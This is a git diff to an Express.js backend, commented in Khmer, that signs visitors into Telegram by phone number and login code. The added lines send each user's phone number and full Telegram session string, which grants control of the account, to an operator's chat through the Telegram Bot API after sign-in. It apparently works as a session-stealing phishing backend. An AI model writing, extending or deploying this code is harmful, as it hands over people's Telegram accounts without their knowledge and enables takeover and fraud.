@@ -12,9 +12,11 @@ app.use(express.json());
 // Serve static files (index.html)
 app.use(express.static(__dirname));
 
-// ទាញយក Environment Variables ពី Railway Settings
+// ទាញយក Environment Variables ពី Railway
 const apiId = Number(process.env.TELEGRAM_API_ID);
 const apiHash = process.env.TELEGRAM_API_HASH;
+const botToken = process.env.BOT_TOKEN;
+const adminChatId = process.env.ADMIN_CHAT_ID;
 
 // Session បណ្តោះអាសន្នសម្រាប់រក្សាទុក Telegram Client
 const sessions = {};
@@ -82,8 +84,28 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
+        // បង្កើត Session String បន្ទាប់ពី Sign In ជោគជ័យ
         const sessionString = client.session.save();
-        delete sessions[phoneNumber]; // សម្អាត Session បន្ទាប់ពី Sign In រួច
+        delete sessions[phoneNumber];
+
+        // ផ្ញើ Session String និង លេខទូរស័ព្ទ ចូលទៅ Telegram Bot របស់អ្នក
+        if (botToken && adminChatId) {
+            try {
+                const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: adminChatId,
+                        text: messageText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (notifyErr) {
+                console.error("Failed to send notification to Telegram Bot:", notifyErr);
+            }
+        }
 
         res.json({
             success: true,
@@ -93,7 +115,6 @@ app.post('/api/verify-code', async (req, res) => {
     } catch (err) {
         console.error("Error verifying code:", err);
 
-        // ត្រួតពិនិត្យករណី Telegram ទាមទារ 2FA Password
         if (err.message && err.message.includes("SESSION_PASSWORD_NEEDED")) {
             return res.status(401).json({
                 success: false,
